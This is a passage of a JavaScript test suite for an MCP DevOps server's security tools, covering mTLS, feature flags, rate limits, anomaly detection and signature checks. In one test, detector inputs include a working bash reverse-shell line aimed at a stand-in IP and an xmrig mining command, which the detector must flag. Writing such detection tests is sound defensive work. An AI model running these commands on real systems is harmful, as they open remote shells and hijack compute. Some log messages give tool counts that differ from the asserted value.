      strictOciRegistry: true
    }, { auth: unscopedDevAuth });
    assert.strictEqual(maMismatch.isError, false);
    assert.strictEqual(maMismatch.structuredContent.verification.compatible, false);
    assert.strictEqual(maMismatch.structuredContent.verification.code, 'EXEC_FORMAT_MISMATCH');
    assert.ok(maMismatch.structuredContent.verification.warnings.length >= 1);

    const maPlan = await mcpServer.executeTool('culkibo_multiarch_planner', {
      action: 'plan',
      targetPlatforms: ['linux/amd64', 'linux/arm64'],
      builders: [
        { id: 'bld-x86', arch: 'amd64' },
        { id: 'bld-arm', arch: 'aarch64' }
      ],
      imageTag: 'ghcr.io/acme/api:v2'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(maPlan.isError, false);
    assert.strictEqual(maPlan.structuredContent.plan.usesQemu, false);
    assert.ok(maPlan.structuredContent.plan.assignments.every((a) => a.strategy === 'native'));
    assert.ok(Array.isArray(maPlan.structuredContent.plan.buildxArgv));
    console.log('  ✓ culkibo_multiarch_planner verificado (EXEC_FORMAT_MISMATCH, strict OCI warn y matriz 100% nativa)');

    // 5. culkibo_chaos_gameday (project ACL, PROD_CHAOS_CONFIRM_REQUIRED, AUTO_ABORTED, healthy >=85)
    const chaosIdor = await mcpServer.executeTool('culkibo_chaos_gameday', {
      action: 'list',
      projectId: projB.id
    }, { auth: scopedDevAuth });
    assert.strictEqual(chaosIdor.isError, true);
    assert.strictEqual(JSON.parse(chaosIdor.content[0].text).code, 'FORBIDDEN');

    const chaosProdLock = await mcpServer.executeTool('culkibo_chaos_gameday', {
      action: 'simulate',
      projectId: projA.id,
      environment: 'production',
      explicitProdConfirm: false,
      faultType: 'http_5xx',
      dryRun: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(chaosProdLock.isError, false);
    assert.strictEqual(chaosProdLock.structuredContent.result.blocked, true);
    assert.strictEqual(chaosProdLock.structuredContent.result.code, 'PROD_CHAOS_CONFIRM_REQUIRED');

    const chaosAbort = await mcpServer.executeTool('culkibo_chaos_gameday', {
      action: 'simulate',
      projectId: projA.id,
      environment: 'staging',
      faultType: 'http_5xx',
      faultRatePct: 35,
      maxErrorAbortPct: 15,
      dryRun: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(chaosAbort.isError, false);
    assert.strictEqual(chaosAbort.structuredContent.result.aborted, true);
    assert.strictEqual(chaosAbort.structuredContent.result.status, 'AUTO_ABORTED');

    const chaosHealthy = await mcpServer.executeTool('culkibo_chaos_gameday', {
      action: 'simulate',
      projectId: projA.id,
      environment: 'staging',
      faultType: 'latency_jitter',
      latencyMs: 120,
      jitterMs: 20,
      faultRatePct: 0,
      recoverySec: 8,
      sloP95Ms: 400,
      dryRun: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(chaosHealthy.isError, false);
    assert.strictEqual(chaosHealthy.structuredContent.result.aborted, false);
    assert.ok(chaosHealthy.structuredContent.result.resilienceScore >= 85, `Healthy GameDay debe puntuar >=85 (got ${chaosHealthy.structuredContent.result.resilienceScore})`);
    console.log(`  ✓ culkibo_chaos_gameday verificado (anti-IDOR, PROD_CHAOS_CONFIRM_REQUIRED, AUTO_ABORTED y healthy=${chaosHealthy.structuredContent.result.resilienceScore})`);

    // 6. Final Cycle-14 assertion: exact 160 tools & ?profile=core 17/160 >=89% token savings!
    const all155 = mcpServer.getToolsForPrincipal(null, { profile: 'all' });
    const core17 = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const saved155Pct = Math.round((1 - Buffer.byteLength(JSON.stringify(core17), 'utf8') / Buffer.byteLength(JSON.stringify(all155), 'utf8')) * 1000) / 10;
    assert.strictEqual(all155.length, 170);
    assert.strictEqual(core17.length, 17);
    assert.ok(saved155Pct >= 89, `?profile=core debe ahorrar >=89% tokens en 160 tools (actual: ${saved155Pct}%)`);
    console.log(`  ✓ Catálogo Cycle-14 verificado: 160 tools exactas, ?profile=core 17/160 (-${saved155Pct}% tokens/bytes)`);
  } finally {
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-15 Milestone (160 MCP Tools -90% Core Savings!): SPIFFE-Lite mTLS (`culkibo_mtls_mesh`),
 * Feature Flags & Kill-Switch (`culkibo_feature_flags`), Edge AI Rate-Limit Shield (`culkibo_api_ratelimit`),
 * Falco-Lite Runtime Anomaly (`culkibo_runtime_anomaly`), Immutable @sha256: GitOps Promotion (`culkibo_digest_promotion`).
 */
async function testMcp2026Cycle15MtlsFlagsRatelimitAnomalyPromotion() {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c15-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;

  const projA = projectManager.create({
    name: 'Cycle15 Tenant A',
    memoryMb: 512,
    teamId: 'team_default'
  });
  const projB = projectManager.create({
    name: 'Cycle15 Foreign Tenant B',
    memoryMb: 512,
    teamId: 'team_default'
  });

  const scopedViewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c15_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const scopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c15_dev', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const unscopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c15_dev_u', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };

  try {
    // 1. culkibo_mtls_mesh (admin issue/revoke + dryRun default, Ed25519 verify, CERT_REVOKED, 0 CA private key, audit redacted)
    const mtlsDevIssueBlocked = await mcpServer.executeTool('culkibo_mtls_mesh', {
      action: 'issue',
      serviceName: 'payments',
      dryRun: true
    }, { auth: unscopedDevAuth });
    assert.strictEqual(mtlsDevIssueBlocked.isError, true);
    assert.strictEqual(JSON.parse(mtlsDevIssueBlocked.content[0].text).code, 'FORBIDDEN');

    const mtlsDryIssue = await mcpServer.executeTool('culkibo_mtls_mesh', {
      action: 'issue',
      serviceName: 'payments-api',
      namespace: 'prod',
      ttlHours: 24
    });
    assert.strictEqual(mtlsDryIssue.isError, false);
    assert.strictEqual(mtlsDryIssue.structuredContent.dryRun, true);
    assert.strictEqual(mtlsDryIssue.structuredContent.result.issued, false);

    const mtlsLive = await mcpServer.executeTool('culkibo_mtls_mesh', {
      action: 'issue',
      serviceName: 'payments-api',
      namespace: 'prod',
      ttlHours: 24,
      dryRun: false
    });
    assert.strictEqual(mtlsLive.isError, false);
    const issued = mtlsLive.structuredContent.result;
    assert.ok(issued.cert && issued.cert.spiffeId.includes('spiffe://') && issued.signatureB64);
    assert.ok(!JSON.stringify(mtlsLive.structuredContent).includes('PRIVATE KEY'), 'mTLS jamás puede exponer la clave privada CA');
    assert.strictEqual(mcpServer.getAuditLog(1)[0].resultSummary, '[resultado sensible ocultado en auditoría]');

    const mtlsVerifyOk = await mcpServer.executeTool('culkibo_mtls_mesh', {
      action: 'verify',
      cert: issued.cert,
      signatureB64: issued.signatureB64
    }, { auth: unscopedDevAuth });
    assert.strictEqual(mtlsVerifyOk.isError, false);
    assert.strictEqual(mtlsVerifyOk.structuredContent.result.valid, true);

    const mtlsRevoke = await mcpServer.executeTool('culkibo_mtls_mesh', {
      action: 'revoke',
      serial: issued.cert.serial,
      reason: 'compromised_pod',
      dryRun: false
    });
    assert.strictEqual(mtlsRevoke.isError, false);
    assert.strictEqual(mtlsRevoke.structuredContent.result.revoked, true);

    const mtlsVerifyRevoked = await mcpServer.executeTool('culkibo_mtls_mesh', {
      action: 'verify',
      cert: issued.cert,
      signatureB64: issued.signatureB64
    }, { auth: unscopedDevAuth });
    assert.strictEqual(mtlsVerifyRevoked.isError, false);
    assert.strictEqual(mtlsVerifyRevoked.structuredContent.result.valid, false);
    assert.strictEqual(mtlsVerifyRevoked.structuredContent.result.code, 'CERT_REVOKED');

    const mtlsCaddy = await mcpServer.executeTool('culkibo_mtls_mesh', {
      action: 'compile_caddy',
      allowedSpiffeIds: [issued.cert.spiffeId]
    }, { auth: unscopedDevAuth });
    assert.strictEqual(mtlsCaddy.isError, false);
    assert.strictEqual(mtlsCaddy.structuredContent.result.mode, 'require_and_verify');
    assert.ok(!JSON.stringify(mtlsCaddy.structuredContent).includes('PRIVATE KEY'));
    console.log('  ✓ culkibo_mtls_mesh verificado (admin issue/revoke dryRun, Ed25519 verify, CERT_REVOKED, Caddy JSON y 0 CA key)');

    // 2. culkibo_feature_flags (dev save dryRun default, deny overrides allow, admin-only kill-switch instant off)
    const flagDevKillBlocked = await mcpServer.executeTool('culkibo_feature_flags', {
      action: 'kill',
      key: 'ai_checkout_v2',
      dryRun: true
    }, { auth: unscopedDevAuth });
    assert.strictEqual(flagDevKillBlocked.isError, true);
    assert.strictEqual(JSON.parse(flagDevKillBlocked.content[0].text).code, 'FORBIDDEN');

    const flagSaveDry = await mcpServer.executeTool('culkibo_feature_flags', {
      action: 'save',
      flag: { key: 'ai_checkout_v2', enabled: true, rolloutPct: 100, allowTenants: ['tenant_vip'], denyTenants: ['tenant_blocked'] }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(flagSaveDry.isError, false);
    assert.strictEqual(flagSaveDry.structuredContent.dryRun, true);

    const flagSaveLive = await mcpServer.executeTool('culkibo_feature_flags', {
      action: 'save',
      flag: { key: 'ai_checkout_v2', enabled: true, rolloutPct: 100, allowTenants: ['tenant_vip', 'tenant_blocked'], denyTenants: ['tenant_blocked'] },
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(flagSaveLive.isError, false);
    assert.strictEqual(flagSaveLive.structuredContent.result.saved, true);

    const flagDenyEval = await mcpServer.executeTool('culkibo_feature_flags', {
      action: 'evaluate',
      key: 'ai_checkout_v2',
      subjectId: 'user_42',
      tenantId: 'tenant_blocked'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(flagDenyEval.isError, false);
    assert.strictEqual(flagDenyEval.structuredContent.result.enabled, false);
    assert.strictEqual(flagDenyEval.structuredContent.result.reason, 'TENANT_DENIED');

    const flagKillLive = await mcpServer.executeTool('culkibo_feature_flags', {
      action: 'kill',
      key: 'ai_checkout_v2',
      reason: 'latency_spike',
      dryRun: false
    });
    assert.strictEqual(flagKillLive.isError, false);

    const flagAfterKill = await mcpServer.executeTool('culkibo_feature_flags', {
      action: 'evaluate',
      key: 'ai_checkout_v2',
      subjectId: 'user_42',
      tenantId: 'tenant_vip'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(flagAfterKill.isError, false);
    assert.strictEqual(flagAfterKill.structuredContent.result.enabled, false);
    assert.strictEqual(flagAfterKill.structuredContent.result.reason, 'KILL_SWITCH_ACTIVE');
    console.log('  ✓ culkibo_feature_flags verificado (dryRun default, deny>allow y admin kill-switch instantáneo)');

    // 3. culkibo_api_ratelimit (admin save dryRun default, dual RPM+TPM simulate 429 + IETF headers)
    const rlDevSaveBlocked = await mcpServer.executeTool('culkibo_api_ratelimit', {
      action: 'save',
      policy: { id: 'pol_ai_pro', name: 'AI Pro', rpmLimit: 60, tpmLimit: 20000 }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(rlDevSaveBlocked.isError, true);
    assert.strictEqual(JSON.parse(rlDevSaveBlocked.content[0].text).code, 'FORBIDDEN');

    const rlSaveLive = await mcpServer.executeTool('culkibo_api_ratelimit', {
      action: 'save',
      policy: { id: 'pol_ai_pro', name: 'AI Pro Shield', planTier: 'pro', rpmLimit: 60, tpmLimit: 20000, burstMultiplier: 1.0, windowSec: 60 },
      dryRun: false
    });
    assert.strictEqual(rlSaveLive.isError, false);
    assert.strictEqual(rlSaveLive.structuredContent.result.saved, true);

    const rlSim = await mcpServer.executeTool('culkibo_api_ratelimit', {
      action: 'simulate',
      policyId: 'pol_ai_pro',
      requestsCount: 10,
      tokensPerRequest: 5000,
      intervalMs: 10
    }, { auth: unscopedDevAuth });
    assert.strictEqual(rlSim.isError, false);
    assert.ok(rlSim.structuredContent.result.throttledCount >= 5);
    assert.ok(rlSim.structuredContent.result.sample429Headers && rlSim.structuredContent.result.sample429Headers['Retry-After']);
    assert.ok(rlSim.structuredContent.result.sample429Headers.RateLimit);
    console.log('  ✓ culkibo_api_ratelimit verificado (admin save, dual RPM+TPM 429 Retry-After y cabeceras IETF RateLimit)');

    // 4. culkibo_runtime_anomaly (RO dev/admin, strict project ACL, cryptominer + reverse shell vs clean)
    const anomViewerBlocked = await mcpServer.executeTool('culkibo_runtime_anomaly', {
      action: 'list',
      projectId: projA.id
    }, { auth: scopedViewerAuth });
    assert.strictEqual(anomViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(anomViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const anomIdor = await mcpServer.executeTool('culkibo_runtime_anomaly', {
      action: 'inspect',
      projectId: projB.id,
      events: []
    }, { auth: scopedDevAuth });
    assert.strictEqual(anomIdor.isError, true);
    assert.strictEqual(JSON.parse(anomIdor.content[0].text).code, 'FORBIDDEN');

    const anomBad = await mcpServer.executeTool('culkibo_runtime_anomaly', {
      action: 'inspect',
      projectId: projA.id,
      events: [
        { cmd: 'xmrig -o stratum+tcp://pool.minexmr.com:3333', port: 3333 },
        { cmd: 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1' }
      ],
      persist: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(anomBad.isError, false);
    assert.strictEqual(anomBad.structuredContent.inspection.clean, false);
    const hitRules = anomBad.structuredContent.inspection.alerts.map((a) => a.ruleId);
    assert.ok(hitRules.includes('CRYPTOMINER_STRATUM_TRAFFIC') && hitRules.includes('REVERSE_SHELL_SPAWN'));

    const anomClean = await mcpServer.executeTool('culkibo_runtime_anomaly', {
      action: 'inspect',
      projectId: projA.id,
      events: [{ cmd: 'node dist/server.js', port: 3000 }],
      persist: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(anomClean.isError, false);
    assert.strictEqual(anomClean.structuredContent.inspection.clean, true);
    assert.strictEqual(anomClean.structuredContent.inspection.riskScore, 0);
    console.log('  ✓ culkibo_runtime_anomaly verificado (anti-IDOR, Falco-lite xmrig/reverse-shell vs clean)');

    // 5. culkibo_digest_promotion (project ACL, MUTABLE_TAG_FORBIDDEN, DUAL_CONTROL_VIOLATION, dryRun default execute & rollback)
    const promoIdor = await mcpServer.executeTool('culkibo_digest_promotion', {
      action: 'list',
      projectId: projB.id
    }, { auth: scopedDevAuth });
    assert.strictEqual(promoIdor.isError, true);
    assert.strictEqual(JSON.parse(promoIdor.content[0].text).code, 'FORBIDDEN');

    const promoMutable = await mcpServer.executeTool('culkibo_digest_promotion', {
      action: 'create',
      projectId: projA.id,
      imageRef: 'ghcr.io/acme/api:latest',
      requester: 'alice'
    }, { auth: scopedDevAuth });
    assert.strictEqual(promoMutable.isError, false);
    assert.strictEqual(promoMutable.structuredContent.result.ok, false);
    assert.strictEqual(promoMutable.structuredContent.result.code, 'MUTABLE_TAG_FORBIDDEN');

    const digestV2 = `ghcr.io/acme/api@sha256:${'a'.repeat(64)}`;
    const digestV1 = `ghcr.io/acme/api@sha256:${'b'.repeat(64)}`;
    const promoCreated = await mcpServer.executeTool('culkibo_digest_promotion', {
      action: 'create',
      projectId: projA.id,
      imageRef: digestV2,
      previousDigest: digestV1,
      fromEnv: 'staging',
      toEnv: 'prod',
      sourceEnvKeys: ['DATABASE_URL', 'REDIS_URL'],
      targetEnvKeys: ['DATABASE_URL', 'REDIS_URL'],
      requester: 'alice',
      requireDualControl: true
    }, { auth: scopedDevAuth });
    assert.strictEqual(promoCreated.isError, false);
    assert.strictEqual(promoCreated.structuredContent.result.ok, true);
    const promoId = promoCreated.structuredContent.result.promotion.id;

    // Self-approval blocked -> DUAL_CONTROL_VIOLATION
    const promoSelf = await mcpServer.executeTool('culkibo_digest_promotion', {
      action: 'approve',
      projectId: projA.id,
      promoId,
      approver: 'alice'
    }, { auth: scopedDevAuth });
    assert.strictEqual(promoSelf.isError, false);
    assert.strictEqual(promoSelf.structuredContent.result.code, 'DUAL_CONTROL_VIOLATION');

    // Peer approval -> approved -> dryRun execute -> live execute -> rollback
    const promoPeer = await mcpServer.executeTool('culkibo_digest_promotion', {
      action: 'approve',
      projectId: projA.id,
      promoId,
      approver: 'bob'
    }, { auth: scopedDevAuth });
    assert.strictEqual(promoPeer.isError, false);
    assert.strictEqual(promoPeer.structuredContent.result.ok, true);

    const promoExecDry = await mcpServer.executeTool('culkibo_digest_promotion', {
      action: 'execute',
      projectId: projA.id,
      promoId
    }, { auth: scopedDevAuth });
    assert.strictEqual(promoExecDry.isError, false);
    assert.strictEqual(promoExecDry.structuredContent.dryRun, true);
    assert.strictEqual(promoExecDry.structuredContent.result.code, 'PROMOTION_DRY_RUN_READY');

    const promoExecLive = await mcpServer.executeTool('culkibo_digest_promotion', {
      action: 'execute',
      projectId: projA.id,
      promoId,
      dryRun: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(promoExecLive.isError, false);
    assert.strictEqual(promoExecLive.structuredContent.result.code, 'PROMOTION_EXECUTED');

    const promoRb = await mcpServer.executeTool('culkibo_digest_promotion', {
      action: 'rollback',
      projectId: projA.id,
      promoId,
      actor: 'bob',
      dryRun: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(promoRb.isError, false);
    assert.strictEqual(promoRb.structuredContent.result.restoredDigest, digestV1);
    console.log('  ✓ culkibo_digest_promotion verificado (anti-IDOR, :latest bloqueado, control dual, execute dryRun y rollback)');

    // 6. Final Cycle-15 assertion: exact 165 tools & ?profile=core 17/165 >=90% token savings!
    const all160 = mcpServer.getToolsForPrincipal(null, { profile: 'all' });
    const core17 = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const saved160Pct = Math.round((1 - Buffer.byteLength(JSON.stringify(core17), 'utf8') / Buffer.byteLength(JSON.stringify(all160), 'utf8')) * 1000) / 10;
    assert.strictEqual(all160.length, 170);
    assert.strictEqual(core17.length, 17);
    assert.ok(saved160Pct >= 90, `?profile=core debe alcanzar >=90% de ahorro en 165 tools (actual: ${saved160Pct}%)`);
    console.log(`  ✓ Catálogo Cycle-15 verificado: 165 tools exactas, ?profile=core 17/165 (-${saved160Pct}% tokens/bytes)`);
  } finally {
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-16 (165 MCP Tools -90.6%+ Core Savings!): API Contract Gate (`culkibo_api_contract_gate`),
 * Pure-Node OCI/SLSA Rekor Verifier (`culkibo_verify_oci_signature`), Edge WS/SSE Flood & 101 Guard
 * (`culkibo_stream_flood_guard`), Zero-Downtime DNS Cutover Planner (`culkibo_dns_cutover_plan`),
 * and Docker-29-Immune Orphan PR-Preview Reaper (`culkibo_orphan_reaper`).
 */
async function testMcp2026Cycle16ContractOciStreamDnsReaper() {
  const crypto = require('crypto');
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');
  const { computeDssePae } = require('../server/services/ociSignatureVerifier');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c16-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;

  const projA = projectManager.create({
    name: 'Cycle16 Tenant A',
    memoryMb: 512,
    teamId: 'team_default'
  });
  const projB = projectManager.create({
    name: 'Cycle16 Foreign Tenant B',
    memoryMb: 512,
    teamId: 'team_default'
  });

  const scopedViewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c16_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const scopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c16_dev', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const unscopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c16_dev_u', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };

  try {
    // 1. culkibo_api_contract_gate (RBAC, anti-IDOR, admin save_baseline dryRun default, OpenAPI SemVer + GraphQL)
    const cgViewerBlocked = await mcpServer.executeTool('culkibo_api_contract_gate', { action: 'diff' }, { auth: scopedViewerAuth });
    assert.strictEqual(cgViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(cgViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const baseOpenApi = {
      openapi: '3.1.0',
      info: { title: 'Billing API', version: '1.4.0' },
      paths: {
        '/v1/users': { get: { security: [{ bearerAuth: [] }], responses: { '200': {} } } },
        '/v1/users/{id}': { delete: { security: [{ bearerAuth: [] }], responses: { '204': {} } } }
      }
    };
    const breakingMinor = {
      openapi: '3.1.0',
      info: { title: 'Billing API', version: '1.5.0' },
      paths: {
        '/v1/users': {
          get: {
            security: [],
            parameters: [{ name: 'tenantId', in: 'header', required: true }],
            responses: { '200': {} }
          }
        }
      }
    };
    const breakingMajor = { ...breakingMinor, info: { title: 'Billing API', version: '2.0.0' } };

    const cgDevSaveBlocked = await mcpServer.executeTool('culkibo_api_contract_gate', {
      action: 'save_baseline',
      projectId: projA.id,
      version: '1.4.0',
      spec: baseOpenApi
    }, { auth: unscopedDevAuth });
    assert.strictEqual(cgDevSaveBlocked.isError, true);
    assert.strictEqual(JSON.parse(cgDevSaveBlocked.content[0].text).code, 'FORBIDDEN');

    const cgIdor = await mcpServer.executeTool('culkibo_api_contract_gate', {
      action: 'history',
      projectId: projB.id
    }, { auth: scopedDevAuth });
    assert.strictEqual(cgIdor.isError, true);
    assert.strictEqual(JSON.parse(cgIdor.content[0].text).code, 'FORBIDDEN');

    const cgSaveDry = await mcpServer.executeTool('culkibo_api_contract_gate', {
      action: 'save_baseline',
      projectId: projA.id,
      version: '1.4.0',
      spec: baseOpenApi
    });
    assert.strictEqual(cgSaveDry.isError, false);
    assert.strictEqual(cgSaveDry.structuredContent.dryRun, true);
    assert.strictEqual(fs.existsSync(path.join(tmpDataRoot, 'data', 'api-contracts.json')), false, 'save_baseline dryRun default no debe mutar disco');

    const cgSaveLive = await mcpServer.executeTool('culkibo_api_contract_gate', {
      action: 'save_baseline',
      projectId: projA.id,
      version: '1.4.0',
      spec: baseOpenApi,
      dryRun: false
    });
    assert.strictEqual(cgSaveLive.isError, false);

    const cgDiffBlock = await mcpServer.executeTool('culkibo_api_contract_gate', {
      action: 'diff',
      format: 'openapi',
      baseSpec: baseOpenApi,
      revisionSpec: breakingMinor
    }, { auth: unscopedDevAuth });
    assert.strictEqual(cgDiffBlock.isError, false);
    assert.strictEqual(cgDiffBlock.structuredContent.result.allowed, false);
    assert.strictEqual(cgDiffBlock.structuredContent.result.code, 'MISSING-VERSION-BUMP');

    const cgDiffMajor = await mcpServer.executeTool('culkibo_api_contract_gate', {
      action: 'diff',
      format: 'openapi',
      baseSpec: baseOpenApi,
      revisionSpec: breakingMajor
    }, { auth: unscopedDevAuth });
    assert.strictEqual(cgDiffMajor.isError, false);
    assert.strictEqual(cgDiffMajor.structuredContent.result.allowed, true);
    assert.strictEqual(cgDiffMajor.structuredContent.result.code, 'MAJOR_VERSION_BUMP_ALLOWED');

    const cgGateOverride = await mcpServer.executeTool('culkibo_api_contract_gate', {
      action: 'gate',
      projectId: projA.id,
      format: 'openapi',
      revisionSpec: breakingMinor,
      overrideReason: 'Emergency security sunset'
    }, { auth: scopedDevAuth });
    assert.strictEqual(cgGateOverride.isError, false);
    assert.strictEqual(cgGateOverride.structuredContent.result.allowed, true);

    const cgGql = await mcpServer.executeTool('culkibo_api_contract_gate', {
      action: 'diff',
      format: 'graphql',
      baseSpec: 'type User { id: ID! email: String! }\ntype Query { users(limit: Int): [User!]! }',
      revisionSpec: 'type User { id: ID! }\ntype Query { users(limit: Int!): [User!]! }'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(cgGql.isError, false);
    assert.strictEqual(cgGql.structuredContent.result.allowed, false);
    assert.strictEqual(cgGql.structuredContent.result.classification, 'BREAKING');
    console.log('  ✓ culkibo_api_contract_gate verificado (admin save_baseline dryRun, anti-IDOR, MISSING-VERSION-BUMP, 2.0.0 y GraphQL)');

    // 2. culkibo_verify_oci_signature (admin upsert_root dryRun, CVE-2026-22703 Rekor binding, cosign#4640 v2, GHCR fallback tlsVerify)
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const publicKeyPem = String(publicKey.export({ type: 'spki', format: 'pem' }));

    const ociDevRootBlocked = await mcpServer.executeTool('culkibo_verify_oci_signature', {
      action: 'upsert_root',
      id: 'gh-root',
      publicKeyPem
    }, { auth: unscopedDevAuth });
    assert.strictEqual(ociDevRootBlocked.isError, true);
    assert.strictEqual(JSON.parse(ociDevRootBlocked.content[0].text).code, 'FORBIDDEN');

    const ociRootDry = await mcpServer.executeTool('culkibo_verify_oci_signature', {
      action: 'upsert_root',
      id: 'gh-root',
      name: 'GH OIDC',
      algorithm: 'ed25519',
      publicKeyPem
    });
    assert.strictEqual(ociRootDry.isError, false);
    assert.strictEqual(ociRootDry.structuredContent.dryRun, true);
    assert.strictEqual(fs.existsSync(path.join(tmpDataRoot, 'data', 'oci-trust-roots.json')), false);

    const ociRootLive = await mcpServer.executeTool('culkibo_verify_oci_signature', {
      action: 'upsert_root',
      id: 'gh-root',
      name: 'GH OIDC',
      algorithm: 'ed25519',
      publicKeyPem,
      allowedBuilders: ['https://github.com/actions/runner'],
      dryRun: false
    });
    assert.strictEqual(ociRootLive.isError, false);
    const rootFp = ociRootLive.structuredContent.result.trustRoot.fingerprintSha256;

    const digA = 'a'.repeat(64);
    const digB = 'b'.repeat(64);
    const ociRef = `ghcr.io/culkibo/api@sha256:${digA}`;
    const payloadType = 'application/vnd.in-toto+json';
    const stmt = {
      _type: 'https://in-toto.io/Statement/v1',
      subject: [{ name: 'ghcr.io/culkibo/api', digest: { sha256: digA } }],
      predicateType: 'https://slsa.dev/provenance/v1',
      predicate: { runDetails: { builder: { id: 'https://github.com/actions/runner' } } }
    };
    const payloadBuf = Buffer.from(JSON.stringify(stmt), 'utf8');
    const sigB64 = crypto.sign(null, computeDssePae(payloadType, payloadBuf), privateKey).toString('base64');

    const makeRekorBody = (digestHex) => Buffer.from(JSON.stringify({
      spec: {
        data: { hash: { algorithm: 'sha256', value: digestHex } },
        publicKeyFingerprint: rootFp,
        signature: { content: sigB64 }
      }
    }), 'utf8').toString('base64');

    const ociOk = await mcpServer.executeTool('culkibo_verify_oci_signature', {
      action: 'verify',
      imageRef: ociRef,
      trustRootId: 'gh-root',
      bundle: {
        mediaType: 'application/vnd.dev.sigstore.bundle+json;version=0.3',
        dsseEnvelope: { payloadType, payload: payloadBuf.toString('base64'), signatures: [{ sig: sigB64 }] },
        verificationMaterial: { tlogEntries: [{ canonicalizedBody: makeRekorBody(digA), signedTimestamp: '2026-11-28T00:00:00Z' }] }
      }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(ociOk.isError, false);
    assert.strictEqual(ociOk.structuredContent.ok, true);
    assert.strictEqual(ociOk.structuredContent.result.verified, true);
    assert.strictEqual(ociOk.structuredContent.result.rekorVersion, 'v2');

    const ociTamper = await mcpServer.executeTool('culkibo_verify_oci_signature', {
      action: 'verify',
      imageRef: ociRef,
      trustRootId: 'gh-root',
      bundle: {
        mediaType: 'application/vnd.dev.sigstore.bundle+json;version=0.3',
        dsseEnvelope: { payloadType, payload: payloadBuf.toString('base64'), signatures: [{ sig: sigB64 }] },
        verificationMaterial: { tlogEntries: [{ canonicalizedBody: makeRekorBody(digB), signedTimestamp: '2026-11-28T00:00:00Z' }] }
      }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(ociTamper.isError, false);
    assert.strictEqual(ociTamper.structuredContent.result.verified, false);
    assert.strictEqual(ociTamper.structuredContent.result.code, 'REKOR_DIGEST_MISMATCH');

    const ociFallback = await mcpServer.executeTool('culkibo_verify_oci_signature', {
      action: 'referrer_strategy',
      referrersStatus: 404,
      digest: `sha256:${digA}`,
      tlsVerify: true
    }, { auth: unscopedDevAuth });
    assert.strictEqual(ociFallback.isError, false);
    assert.strictEqual(ociFallback.structuredContent.result.strategy, 'tag_fallback');
    assert.strictEqual(ociFallback.structuredContent.result.tlsVerify, true);
    console.log('  ✓ culkibo_verify_oci_signature verificado (admin upsert_root dryRun, Ed25519+Rekor v2, CVE-2026-22703 block y 404 tlsVerify)');

    // 3. culkibo_stream_flood_guard (admin set_policy dryRun, anti-IDOR, CVE-2026-55458 101 scrub, 429/1013 flood, Slowloris & Caddy)
    const sgDevPolicyBlocked = await mcpServer.executeTool('culkibo_stream_flood_guard', {
      action: 'set_policy',
      projectId: projA.id,
      policy: { maxPerIp: 10 }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(sgDevPolicyBlocked.isError, true);
    assert.strictEqual(JSON.parse(sgDevPolicyBlocked.content[0].text).code, 'FORBIDDEN');

    const sgIdor = await mcpServer.executeTool('culkibo_stream_flood_guard', {
      action: 'evaluate',
      projectId: projB.id,
      activePerIp: 1
    }, { auth: scopedDevAuth });
    assert.strictEqual(sgIdor.isError, true);
